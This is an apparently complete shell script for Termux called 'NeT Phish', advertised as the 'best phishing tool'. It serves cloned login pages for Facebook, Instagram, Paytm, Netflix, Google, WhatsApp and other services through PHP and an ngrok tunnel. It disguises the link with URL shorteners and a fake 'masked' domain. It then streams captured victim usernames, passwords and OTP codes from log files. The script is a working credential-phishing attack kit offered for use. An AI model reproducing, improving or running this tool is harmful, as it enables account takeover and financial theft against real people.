#!/data/data/com.termux/files/usr/bin/bash
##############################################
#                                            #
#             PROJECT: NeT Phish                 #
#             AUTHOR: MR-ForG35             #
#              NET-PHISH ©2024                   #
#     GITHUB: MR-ForG35       #
#           BEST PHISHING TOOLS              #              
#       created by :- MR-ForG35      #
#                                            #
##############################################


clear
echo ""
echo ""
echo -e "\e[32m                ============================================\e[m "
echo -e "\e[31m                [\e[32m★\e[31m]\e[93m TECH KNOW LINUX on youtube:MR-ForG35[31m [\e[32m★\e[31m]\e[m "
echo -e "\e[32m                ============================================\e[m " 

# check the internet connectivity 
connection() {
while :
do
if curl -s --head  --request GET www.google.com | grep "200 OK" > /dev/null ; then
    echo -e "\e[1;92m>> \e[1;93m[\e[1;92m Active ●\e[1;93m ]\e[m"
    echo 
    sleep 3
    break
else
    echo -e "\e[1;92m>> \e[1;93m[\e[1;91m Inactive ●\e[1;93m ]\e[m"
    sleep 2
    echo
    echo -e "\e[1;92m>> \e[1;91mCheck your connection and Try Again (⁠◔⁠‿⁠◔⁠) !!\e[m"
    sleep 3
    echo
    exit
fi
done
}

#NeT-PhisH logo
NET-PHISH_logo() {
clear
echo -e "\e[92m
NET-PHISH ©2024 
MR-ForG35 (⁠◔⁠‿⁠◔⁠)\e[34m

                               8b
                               88b
                               888b
                               8888b
                               88888b
                               888888b
                             .d88888888b.__
                       _.od888888888888888888boo..._
                   .od8888888888888888888888888888888booo.._
                .od888888888888888888888888888888888888888888\)
              .d888P\'    \"Y88888888888888888888(_   _ )888P\"\'
            .d8888Poo.     \`Y88888888888888888P-.\`-\`@\'.-\'\"\"-.
   .oooooood8888888P\"\"\'     \`\"Y8888888P.d888P   \`---\'\"\"\"\".-\'
 d888888888'888P\'  _...-----..__      \'d88888__...------\'
 \`\"\"Y88888\'8888|-\'              \`----\'|88888P
         \`Y8888b                       Y888P
          888888b                       \`\"\'
           Y88888
           jgs/VK  \`Y88P
           YP\e[m"
}


echo 
echo 
echo -e "\e[31m[\e[32m★\e[31m]\e[32m CONNECT TO STABLE INTERNET CONNECTION\e[m "
sleep 2
echo 
echo 
echo -en "\e[31m[\e[32m*\e[31m]\e[32m HAVE YOU CONNECTED TO IT (y/n)? \e[m "
read ans
if [ "$ans" != "${ans#[Yy]}" ]; then
echo 
echo 
echo -e "\e[92m>>\e[96m BEST PHISHING TOOL \e[m "
tput civis
sleep 4
tput cnorm
else 
exit
fi

#file_check Camera

file_check() {
if [ -d "/sdcard/Camera_hack" ]
then
echo
else 
mkdir /sdcard/Camera_hack
fi
}

#file_check1 Audio 

file_check1() {
if [ -d "/sdcard/Audio_hack" ]
then
echo
else 
mkdir /sdcard/Audio_hack
fi
}

#catch_ip camera

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

}

#spin
spin_whale () {
local pid=$!
local delay=0.05
local spinstr='|/-\'
while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
local temp=${spinstr#?}
tput civis
printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Setting up Net-phish ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
local spinstr=$temp${spinstr%"$temp"}
sleep $delay
printf "\b\b\b\b\b\b"
done
printf "   \b\b\b"
tput cnorm
printf "\e[1;92m [Done]\e[0m"
echo
}

#spin
spin () {
local pid=$!
local delay=0.05
local spinstr='|/-\'
while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
local temp=${spinstr#?}
tput civis
printf "\e[1;91m\r[\e[92m*\e[91m]\e[1;93m Fetching server ... [\e[1;92m%c\e[1;93m]\e[0m  " "$spinstr"
local spinstr=$temp${spinstr%"$temp"}
sleep $delay
printf "\b\b\b\b\b\b"
done
printf "   \b\b\b"
tput cnorm
printf "\e[1;92m [Done]\e[0m"
echo
}

spinner () {

local pid=$!
local delay=0.25
local spinner=( '█■■■■'Mr '■█■■■'ForG35 '■■█■■'PaGla '■■■█■'Team '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Executing Firewall ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "\e[1;92m [Done]\e[0m";
echo "";
}

spinner1 () {

local pid=$!
local delay=0.25
local spinner=( '█■■■■'Mr  '■█■■■'ForG35 '■■█■■'PaGla'■■■█■'Team '■■■■█' )

while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do

for i in "${spinner[@]}"
do
	tput civis
	echo -ne "\033[1;91m\r[\e[1;92m*\e[1;91m]\e[1;93m Masking Domain ... \e[1;93m[\033[1;92m$i\033[1;93m]\033[0m   ";
	sleep $delay
	printf "\b\b\b\b\b\b\b\b";
done
done
printf "   \b\b\b\b\b"
tput cnorm
printf "\e[1;92m [Done]\e[0m";
echo "";
}

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok

while :
do
clear
echo "
 
 ███▄    █ ▓█████▄▄▄█████▓ ██▓███   ██░ ██  ██▓  ██████  ██░ ██ 
 ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓██░  ██▒▓██░ ██▒▓██▒▒██    ▒ ▓██░ ██▒
▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▓██░ ██▓▒▒██▀▀██░▒██▒░ ▓██▄   ▒██▀▀██░
▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ▒██▄█▓▒ ▒░▓█ ░██ ░██░  ▒   ██▒░▓█ ░██ 
▒██░   ▓██░░▒████▒ ▒██▒ ░ ▒██▒ ░  ░░▓█▒░██▓░██░▒██████▒▒░▓█▒░██▓
░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ▒▓▒░ ░  ░ ▒ ░░▒░▒░▓  ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
░ ░░   ░ ▒░ ░ ░  ░   ░    ░▒ ░      ▒ ░▒░ ░ ▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
   ░   ░ ░    ░    ░      ░░        ░  ░░ ░ ▒ ░░  ░  ░   ░  ░░ ░
         ░    ░  ░                  ░  ░  ░ ░        ░   ░  ░  ░
                                                                

 ------------------------------------------------------------------------------------------------------------------
 ------------------------------------C R E A T E D  B Y------------------------------------------------------------


███████╗ ██████╗ ███╗   ███╗██████╗  █████╗ ████████╗
██╔════╝██╔═══██╗████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝
███████╗██║   ██║██╔████╔██║██████╔╝███████║   ██║   
╚════██║██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║   ██║   
███████║╚██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                     

                                                                                                            " |lolcat -a -d 7


echo 
echo -e $'\e[1;32m        =======================================           \e[0m'
echo -e $'        \e[1;37;41m    c r e a t e d  b y  M r - F o r G 3 5    \e[m '
echo -e $'\e[1;32m        =======================================           \e[0m '
echo 
banner(){
echo -e "\e[1;96m==================================================================\e[m "
echo " "
printf "\e[1;31m[\e[0m\e[1;92m01\e[0m\e[1;31m] \e[0m\e[1;37;44mFacebook\e[0m           \e[1;31m[\e[0m\e[1;92m12\e[0m\e[1;31m] \e[0m\e[1;37;104mLinkedin\e[0m          \e[1;31m[\e[0m\e[1;92m23\e[0m\e[1;31m] \e[0m\e[1;37;44mWordpress\e[0m\n"
echo
printf "\e[1;31m[\e[0m\e[1;92m02\e[0m\e[1;31m] \e[0m\e[1;37;41mPinterest\e[0m          \e[1;31m[\e[0m\e[1;92m13\e[0m\e[1;31m] \e[0m\e[1;37;46mHotstar\e[0m           \e[1;31m[\e[0m\e[1;92m24\e[0m\e[1;31m] \e[0m\e[1;37;43mSnapchat\e[0m\n" 
echo
printf "\e[1;31m[\e[0m\e[1;92m03\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInstagram\e[0m          \e[1;31m[\e[0m\e[1;92m14\e[0m\e[1;31m] \e[0m\e[1;37;42mSpotify\e[0m           \e[1;31m[\e[0m\e[1;92m25\e[0m\e[1;31m] \e[0m\e[1;37;40mProtonmail\e[0m\n"
echo
printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;37;40mUber \e[1;37;42mEats\e[0m          \e[1;31m[\e[0m\e[1;92m15\e[0m\e[1;31m] \e[0m\e[1;37;40mGithub\e[0m            \e[1;31m[\e[0m\e[1;92m26\e[0m\e[1;31m] \e[0m\e[1;38;5;209m\e[40mStackoverflow\e[0m\n" 
echo
printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;93;40mOLA\e[0m                \e[1;31m[\e[0m\e[1;92m16\e[0m\e[1;31m] \e[0m\e[1;37;43mIPFinder\e[0m          \e[1;31m[\e[0m\e[1;92m27\e[0m\e[1;31m] \e[0m\e[1;40m\e[91mE\e[94mb\e[93ma\e[92my\e[0m\n"  
echo
printf "\e[1;31m[\e[0m\e[1;92m06\e[0m\e[1;31m] \e[0m\e[1;40m\e[94mG\e[91mO\e[93mO\e[94mG\e[92mL\e[91mE\e[0m             \e[1;31m[\e[0m\e[1;92m17\e[0m\e[1;31m] \e[0m\e[1;37;101mZomato\e[0m            \e[1;31m[\e[0m\e[1;92m28\e[0m\e[1;31m] \e[0m\e[1;48;5;129mTwitch\e[0m\n"           
echo
printf "\e[1;31m[\e[0m\e[1;92m07\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mtm\e[0m              \e[1;31m[\e[0m\e[1;92m18\e[0m\e[1;31m] \e[0m\e[1;48;5;91mPhonePay\e[0m          \e[1;31m[\e[0m\e[1;92m29\e[0m\e[1;31m] \e[0m\e[1;48;5;236mAJIO\e[0m\n"
echo
printf "\e[1;31m[\e[0m\e[1;92m08\e[0m\e[1;31m] \e[0m\e[1;91;107mNetflix\e[0m            \e[1;31m[\e[0m\e[1;92m19\e[0m\e[1;31m] \e[0m\e[1;107m\e[30mPay\e[106mpal\e[0m            \e[1;31m[\e[0m\e[1;92m30\e[0m\e[1;31m] \e[0m\e[1;48;5;21mMobikwik\e[0m\n"   
echo
printf "\e[1;31m[\e[0m\e[1;92m09\e[0m\e[1;31m] \e[0m\e[1;48;5;200mInsta-Followers\e[0m    \e[1;31m[\e[0m\e[1;92m20\e[0m\e[1;31m] \e[0m\e[1;48;5;4mTelegram\e[0m          \e[1;31m[\e[0m\e[1;92m31\e[0m\e[1;31m] \e[0m\e[1;48;5;89mCamera_hack\e[m\n"
echo
printf "\e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;37;40mAmazon\e[0m             \e[1;31m[\e[0m\e[1;92m21\e[0m\e[1;31m] \e[0m\e[1;37;46mTwitter\e[0m           \e[1;31m[\e[0m\e[1;92m32\e[0m\e[1;31m] \e[0m\e[1;48;5;197mAudio_hack\e[m\n"
echo
printf "\e[1;31m[\e[0m\e[1;92m11\e[0m\e[1;31m] \e[0m\e[1;37;42mWhatsApp\e[0m           \e[1;31m[\e[0m\e[1;92m22\e[0m\e[1;31m] \e[0m\e[1;34;103mFlipcart\e[0m          \e[1;31m[\e[0m\e[1;92m99\e[0m\e[1;31m] \e[0m\e[1;91;102mExit\e[0m\n"
echo " "
echo -e "\e[1;96m==================================================================\e[m "
}

banner
echo 
ash() {
	sleep 0.5
	url_checker() {
	if [ ! "${1//:*}" = http ]; then
	if [ ! "${1//:*}" = https ]; then
	echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
	exit 1
	fi
	fi
         }
        echo
	echo -e "\e[1;96m=============================================================\e[m "
        short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${link})
        shorter=${short#https://}
        echo
        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Mask Your url domain here [\e[1;91mEx. https://facebook.com\e[1;92m] :\e[m ' mask
        echo
        url_checker $mask
        echo -e "\e[1;96m>>\e[1;93m Enter some words you like to mention in url \e[1;92m[\e[1;92mEx.free-insta-followers\e[1;92m] \e[m "
	sleep 1
        echo
	echo -e "\e[1;96m>>\e[1;91m NOTE:\e[1;93m Don't use space in your words,\e[1;92m[\e[1;91minstead use \e[1;92m'-'\e[1;91m to avoid space\e[1;92m] \e[m "
	sleep 2
	echo
        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Enter your words here :\e[0m ' words
        echo
	sleep 3
        final=$mask-$words@$shorter
        echo -e "\e[1;91m[\e[1;92m~\e[1;91m]\e[1;92m Your phishing url >>\e[m $final "
	echo
        }

ash1() {   
        echo;      
	echo `wget -q -O - http://tny.im/yourls-api.php?action=shorturl\&format=simple\&url=${link}\&keyword=$2`
	echo;
}

        read -p $'\e[1;91m[\e[1;92m~\e[1;91m]\e[1;93m Choose Your Option : \e[0m' option
	
         if [ $option = 01 ] || [ $option = 1 ]
         then
	                    cd /data/data/com.termux/files/usr/bin/phs
                            cd facebook/
                            echo 
			    connection
			    ( sleep 5 ) &> /dev/null & spin_whale
			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
			    sleep 1  
			    echo 
			    (sleep 6) &> /dev/null & spin
			    echo
			    tput civis
			    ./ngrok http 4444 > /dev/null 2>&1 & 
			    ( sleep 18 ) &> /dev/null & spinner
			    echo 
			    tput cnorm
			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
			    ( sleep 6 ) &> /dev/null & spinner1
			    ash 
			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			    clear
			    whale_logo
			    echo 
			    echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			    echo 
			    echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m=========================\e[92m"
			    echo
			    touch usernames.txt >> /dev/null 2>&1
			    tail -f usernames.txt 
	
                            break;
			     
	 elif [ $option = 02 ] || [ $option = 2 ]
	 then
			   cd /data/data/com.termux/files/usr/bin/phs
                           cd pinterest/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                      
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "id" -e "password"      

                           break;

	 elif [ $option = 03 ] || [ $option = 3 ]
	 then
		           cd /data/data/com.termux/files/usr/bin/phs
			   cd instagram/
			   echo 
			   connection
			   ( sleep 5 ) &> /dev/null & spin_whale
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &  
			   sleep 1
			   echo 
			   (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
			   ./ngrok http 4444 > /dev/null 2>&1 &
			   ( sleep 18 ) &> /dev/null & spinner
			   echo 
			   tput cnorm
			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
			   ( sleep 6 ) &> /dev/null & spinner1
			   ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
	        	   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			   echo
			   tail -f log.txt
			   
                           break;
			   
	elif [ $option = 04 ] || [ $option = 4 ]
        then
                          cd /data/data/com.termux/files/usr/bin/phs
			  cd UberEats-Phishing/
			  echo 
			  connection
			  ( sleep 5 ) &> /dev/null & spin_whale
			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
			  sleep 1
			  echo 
			  (sleep 6) &> /dev/null & spin
			  echo
			  tput civis
			  ./ngrok http 4444 > /dev/null 2>&1 &
			  ( sleep 18 ) &> /dev/null & spinner
			  echo 
			  tput cnorm
			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
			  ( sleep 6 ) &> /dev/null & spinner1
			  ash 
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			  echo
			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"

                          break;
			  
        elif [ $option = 05 ] || [ $option = 5 ]
        then
                          cd /data/data/com.termux/files/usr/bin/phs
                          cd ola-otpbypass/
                          echo 
			  connection
                          ( sleep 5 ) &> /dev/null & spin_whale
		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
		          sleep 1   
		          echo 
		          (sleep 6) &> /dev/null & spin
			  echo
			  tput civis
		          ./ngrok http 4444 > /dev/null 2>&1 &
		          ( sleep 18 ) &> /dev/null & spinner
		          echo 
			  tput cnorm
		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  		        
			  ( sleep 6 ) &> /dev/null & spinner1
		          ash
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			  echo
		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"

                          break;
			  
         elif [ $option = 06 ] || [ $option = 6 ]
	 then
                          cd /data/data/com.termux/files/usr/bin/phs
                          cd google-otp/
                          echo 
			  connection
		          ( sleep 5 ) &> /dev/null & spin_whale  
		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
		          sleep 1
		          echo 
		          (sleep 6) &> /dev/null & spin 
			  echo
			  tput civis
		          ./ngrok http 4444 > /dev/null 2>&1 &
		          ( sleep 18 ) &> /dev/null & spinner
		          echo 
			  tput cnorm
		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
			  ( sleep 6 ) &> /dev/null & spinner1
		          ash
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
			  echo
		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
  
                          break;
			  
       elif [ $option = 07 ] || [ $option = 7 ]
       then
                          cd /data/data/com.termux/files/usr/bin/phs
                          cd Paytm-Phishing/
                          echo 
                          echo -e "\e[1;31m[\e[0m\e[1;77m 1 \e[0m\e[1;31m]\e[0m\e[1;32m Sign In \e[0m" 
			  echo
                          echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Sign UP \e[0m"
                          echo 
                          read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
		          if [ $option1 = 1 ] || [ $option1 = 01 ]
			  then
			        cd paytm/
                                echo 
				connection
                                ( sleep 5 ) &> /dev/null & spin_whale
                                php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                sleep 1
                                echo 
                                (sleep 6) &> /dev/null & spin
				echo
				tput civis
                                ./ngrok http 4444 > /dev/null 2>&1 &
                                ( sleep 18 ) &> /dev/null & spinner
                                echo 
				tput cnorm
                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
				( sleep 6 ) &> /dev/null & spinner1
			        ash
				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			        clear
				whale_logo
			        echo 
			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			        echo 
			        echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                                echo 
                                tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
		
	                	else
                
                                cd signup/
                                echo 
				connection
                                ( sleep 5 ) &> /dev/null & spin_whale
                                php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                sleep 1
                                echo 
                                (sleep 6) &> /dev/null & spin
				echo
				tput civis
                                ./ngrok http 4444 > /dev/null 2>&1 &
                                ( sleep 18 ) &> /dev/null & spinner
                                echo 
				tput cnorm
                                link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                             
				( sleep 6 ) &> /dev/null & spinner1
			        ash
				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			        clear
				whale_logo
			        echo
			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			        echo 
			        echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                                echo 
                                tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
				fi
                                
				break;
				
        elif [ $option = 08 ] || [ $option = 8 ]
	then

                          cd /data/data/com.termux/files/usr/bin/phs
                          cd Netflix/
                          echo 
			  connection
                          ( sleep 5 ) &> /dev/null & spin_whale
                          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                          sleep 1
                          echo
                          (sleep 6) &> /dev/null & spin
			  echo
			  tput civis
                          ./ngrok http 4444 > /dev/null 2>&1 &
                          ( sleep 18 ) &> /dev/null & spinner
                          echo 
			  tput cnorm
                          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                                                 
			  ( sleep 6 ) &> /dev/null & spinner1
		          ash
			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			  clear
			  whale_logo
			  echo 
			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			  echo 
			  echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                          echo 
                          tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 

                          break;

           elif [ $option = 09 ] || [ $option = 9 ]
	   then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd instafollow/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                         
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
		           echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        

                           break;
			   
               elif [ $option = 10 ]
	       then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd amazonsign/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "email" -e "password" -e "OTP"  

                           break;

                  elif [ $option = 11 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd whatsapp-phishing/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      

                           break;
			   
	          elif [ $option = 12 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Linkedin/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo 
			   echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       

                           break;
   
                     elif [ $option = 13 ]
	             then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Hotstar-otp-bypass/
                           echo 
			   connection
                           ( sleep 5 ) &> /dev/null & spin_whale
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 1
                           echo 
                           (sleep 6) &> /dev/null & spin
			   echo
			   tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           ( sleep 18 ) &> /dev/null & spinner
                           echo 
			   tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
			   ( sleep 6 ) &> /dev/null & spinner1
		           ash
			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
			   clear
			   whale_logo
			   echo 
			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
		           echo 
		           echo -e "\e[96m========================\e[92m    Net-Phish © 2024    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "phoneNo" -e "OTP"       

                           break;
      
